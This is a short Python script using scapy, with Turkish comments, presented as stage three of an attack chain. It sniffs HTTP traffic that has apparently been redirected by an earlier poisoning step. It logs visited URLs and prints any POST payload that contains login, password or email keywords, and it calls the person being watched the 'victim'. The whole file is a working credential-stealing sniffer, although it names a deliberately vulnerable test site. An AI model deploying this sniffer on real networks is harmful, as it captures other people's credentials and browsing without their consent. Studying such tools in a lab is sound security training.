from scapy.all import sniff, Raw
from scapy.layers.http import HTTPRequest 

# --- STAGE 3: PACKET SNIFFER ---
# AMAÇ: Zehirlenen trafikten HTTP verilerini okumak.

def process_packet(packet):
    # Sadece HTTP İsteklerini yakala
    if packet.haslayer(HTTPRequest):
        # 1. URL'i Çek
        try:
            url = packet[HTTPRequest].Host.decode() + packet[HTTPRequest].Path.decode()
            print(f"\n[+] URL ZİYARET EDİLDİ: {url}")
        except:
            pass

        # 2. Şifre/Kullanıcı Adı var mı? (POST Data)
        if packet.haslayer(Raw):
            try:
                load = packet[Raw].load.decode(errors="ignore")
                keywords = ["username", "user", "login", "password", "pass", "email", "giris"]
                
                for keyword in keywords:
                    if keyword in load.lower():
                        print(f"\n" + "*"*40)
                        print(f"[!!!] KRİTİK VERİ YAKALANDI:\n{load}")
                        print("*"*40 + "\n")
                        break
            except:
                pass

if __name__ == "__main__":
    print("[*] Ağ Dinleniyor... (HTTP trafiği bekleniyor)")
    print("[*] Kurban şifresiz bir siteye (örn: testphp.vulnweb.com) girerse burada görünecek.")
    
    # store=False hafızayı doldurmasın diye
    try:
        sniff(store=False, prn=process_packet)
    except Exception as e:
        print(f"Hata: {e}")